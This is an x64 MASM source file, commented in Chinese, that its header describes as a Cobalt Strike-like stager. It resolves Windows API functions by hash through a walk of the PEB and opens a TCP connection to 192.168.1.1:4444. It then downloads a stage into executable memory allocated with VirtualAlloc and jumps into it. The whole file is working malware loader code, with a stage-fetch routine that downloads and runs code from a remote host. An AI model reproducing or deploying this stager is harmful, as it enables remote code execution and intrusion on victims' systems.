;-------------------------------------------------------------------------------------------
; Author: oneday
; Language: MASM
; Details: A stager similar to Cobalt Strike, using Server.py to start the server, 
;          then run this assembly file to download and execute the stage from the server.
;-------------------------------------------------------------------------------------------

.code

main proc

	; 1. 清除方向标志并对齐栈指针，确保符合Windows x64调用约定
	cld														; 清除方向标志（DF=0），字符串操作向高地址进行
	and rsp, 0FFFFFFFFFFFFFFF0h								; 将RSP对齐到16字节边界，避免栈未对齐导致的异常

	; 2.加载ws2_32.dll库
	push 0													; 为了对齐
	mov r14, '23_2sw'										; 构造字符串'ws2_32\0'
	push r14												; 将字符串压栈，此时RSP指向"ws2_32\0"的地址
	mov rcx, rsp											; RCX = 字符串地址，作为LoadLibraryA的参数
	mov r10, 56590AE9h										; kernel32.dll+LoadLibraryA的哈希值
	call GetProcAddressByHash

	; 3.调用WSAStartup函数
	sub rsp, 400+8											; WSAData结构体大小400字节，8个字节对齐
	mov r13,rsp												; R13保存WSAData结构指针
	mov r12,0101A8C05C110002h								; 构造sockaddr_in结构：192.168.1.1:4444, AF_INET
	push r12												; 压栈保存sockaddr_in结构
	mov r12,rsp												; R12保存sockaddr_in结构指针
	mov rdx,r13												; RDX = WSAData结构指针
	push 0101h												; Winsock 1.1版本
	pop rcx													; RCX = 0101h
	mov r10,4645344Ch										; ws2_32.dll+WSAStartup的哈希值
	call GetProcAddressByHash
	
	test eax,eax
	jnz failure

	; 4.调用WSASocketA函数
	mov rcx,2												; af=AF_INET (IPv4)
	mov rdx,1												; af=SOCK_STREAM (TCP)
	xor r8,r8												; protocol = 0 (默认)
	xor r9,r9												; lpProtocolInfo = NULL
	push r9													; dwFlags = 0
	push r9													; g=0
	mov r10,0B83D505Ah										; ws2_32.dll+WSASocketA的哈希值
	call GetProcAddressByHash
	xchg rdi,rax											; 保存套接字句柄到RDI

	; 6.调用connect函数
	mov rcx,rdi												; 套接字句柄
	mov rdx,r12												; sockaddr_in结构指针
	push 16													; sockaddr_in结构长度
	pop r8													; R8 = 16
	mov r10,6AF3406Dh										; ws2_32.dll+connect的哈希值
	call GetProcAddressByHash

	test eax,eax						
	jnz failure

	; 7. 清栈
	add rsp, ((400+8)+(5*8)+(4*32))

	; 8.调用VirtualAlloc分配内存空间用于存储Shellcode
	xor rcx, rcx                    						; lpAddress = NULL（由系统选择地址）
	mov rdx, 00400000h              						; dwSize = 4MB（分配内存大小）
	mov r8, 1000h                   						; flAllocationType = MEM_COMMIT（提交物理内存）
	mov r9, 40h                     						; flProtect = PAGE_EXECUTE_READWRITE（可读可写可执行）
	mov r10, 0FBFA86AFh             						; kernel32.dll+VirtualAlloc 的哈希值
	call GetProcAddressByHash

read_pre:
	xchg rax,rbx											; RBX = 分配的内存基地址
	push rbx												; 保存基地址
read_more:
	mov rcx,rdi												; 套接字句柄
	mov rdx,rbx												; 当前写入指针
	mov r8,8192												; 每次读取8192字节
	xor r9,r9												; flags = 0
	mov r10,0F1606037h										; ws2_32.dll+recv的哈希值
	call GetProcAddressByHash
	add rsp, 32												; 清理影子空间

	add rbx,rax												; 移动写入指针
	test eax,eax											; 检查接收字节数
	jnz read_more											; 继续接收直到返回0

execute_stage:
	pop rax
	jmp continue	                             			; 跳转到下载的Shellcode执行
exec:
	jmp rax
continue:
	call exec

	; 结束
failure:
    mov r10,0DE2D94D9h              						; kernel32.dll+ExitProcess 哈希值
    call GetProcAddressByHash 

GetProcAddressByHash:
	
	; 1. 保存前4个参数到栈上，并保存rsi和r12的值
	push r9
	push r8
	push rdx
	push rcx
	push rsi
	push r12

	; 2. 获取 InMemoryOrderModuleList 模块链表的第一个模块结点
	xor rdx,rdx												; 清零
	mov rdx,gs:[rdx+60h]									; 通过GS段寄存器获取PEB地址（TEB偏移0x60处）
	mov rdx,[rdx+18h]										; PEB->Ldr
	mov rdx,[rdx+20h]										; 第一个模块节点，也是链表InMemoryOrderModuleList的首地址

	;3.模块遍历
next_mod:
	mov rsi,[rdx+50h]                 						; 模块名称
	movzx rcx,word ptr [rdx+48h]	 						; 模块名称长度
	xor r8,r8                         						; 存储接下来要计算的hash

	; 4.计算模块hash
loop_modname:
	xor rax, rax											; 清零EAX，准备处理字符
	lodsb													; 从rSI加载一个字节到AL（自动递增rSI）
	cmp al,'a'												; 比较当前字符的ASCII值是否小于小写字母'a'(0x61)
	jl not_lowercase										; 如果字符 < 'a'，说明不是小写字母，跳转不处理
	sub al, 20h												; 若字符在'a'-'z'范围内，通过减0x20转换为大写字母（'A'-'Z'）
not_lowercase:
	ror r8d,0dh												; 对R8的低32位进行循环右移13位，不影响高32位
	add r8d,eax												; 将当前字符的ASCII值（已大写化）累加到哈希值
	dec ecx													; 字符计数器ECX减1
	jnz loop_modname										; 继续循环处理下一个字符，直到ECX减至0
	push rdx												; 将当前模块链表节点地址压栈    
	push r8													; 将计算完成的哈希值压栈存储hash值

	; 5.获取导出表
	mov rdx, [rdx+20h]										; 获取模块基址
	mov eax, dword ptr [rdx+3ch]							; 读取PE头的RVA
	add rax, rdx											; PE头VA
	cmp word ptr [rax+18h],20Bh								; 检查是否为PE64文件
	jne get_next_mod1										; 不是就下一个模块
	mov eax, dword ptr [rax+88h]							; 获取导出表的RVA
	test rax, rax											; 检查该模块是否有导出函数
	jz get_next_mod1										; 没有就下一个模块
	add rax, rdx											; 获取导出表的VA
	push rax												; 存储导出表的地址
	mov ecx, dword ptr [rax+18h]							; 按名称导出的函数数量
	mov r9d, dword ptr [rax+20h]							; 函数名称字符串地址数组的RVA
	add r9, rdx												; 函数名称字符串地址数组的VA

	; 6.获取函数名	
get_next_func:	
	test rcx, rcx											; 检查按名称导出的函数数量是否为0
	jz get_next_mod											; 若所有函数已处理完，跳转至下一个模块遍历
	dec rcx													; 函数计数器递减（从后向前遍历函数名数组）
	mov esi, dword ptr [r9+rcx*4]							; 从末尾往前遍历，一个函数名RVA占4字节
	add rsi, rdx											; 函数名RVA
	xor r8, r8												; 存储接下来的函数名哈希

	; 7.计算模块 hash + 函数 hash之和
loop_funcname: 
	xor rax, rax											; 清零EAX，准备处理字符
	lodsb													; 从rsi加载一个字节到al，rsi自增1
	test al, al
	jz end_funcname
	ror r8d,0dh												; 对当前哈希值（r8d）循环右移13位
	add r8d,eax												; 将当前字符的ASCII值（al）累加到哈希值（r8d）
	jmp loop_funcname										; 若字符非0，继续循环处理下一个字符

end_funcname:
	add r8,[rsp+8]											; 将之前压栈的模块哈希值（位于栈顶+8）加到当前函数哈希
	cmp r8d,r10d											; r10存储目标hash
	jnz get_next_func

	; 8.获取目标函数指针
	pop rax													; 获取之前存放的当前模块的导出表地址
	mov r9d, dword ptr [rax+24h]							; 获取序号表（AddressOfNameOrdinals）的 RVA
	add r9, rdx												; 序号表起始地址
	mov cx, [r9+2*rcx]										; 从序号表中获取目标函数的导出索引
	mov r9d, dword ptr [rax+1ch]							; 获取函数地址表（AddressOfFunctions）的 RVA
	add r9, rdx												; AddressOfFunctions数组的首地址
	mov eax, dword ptr [r9+4*rcx]							; 获取目标函数指针的RVA
	add rax, rdx											; 获取目标函数指针的地址

finish:
	pop r8													; 清除当前模块hash
	pop r8													; 清除当前链表的位置
	pop r12
	pop rsi													; 恢复RSI
	pop rcx													; 恢复第一个参数
	pop rdx													; 恢复第二个参数
	pop r8													; 恢复第三个参数
	pop r9													; 恢复第四个参数
	pop r10													; 将返回地址地址存储到r10中
	sub rsp, 20h											; 给前4个参数预留 4*8=32（20h）的影子空间
	push r10												; 返回地址
	jmp rax													; 调用目标函数

get_next_mod:                 
	pop rax                         						; 弹出栈中保存的导出表地址
get_next_mod1:
	pop r8                         				 			; 弹出之前压栈的计算出来的模块哈希值
	pop rdx                         						; 弹出之前存储在当前模块在链表中的位置
	mov rdx, [rdx]                  						; 获取链表的下一个模块节点（FLINK）
	jmp next_mod                    						; 跳转回模块遍历循环

main endp
end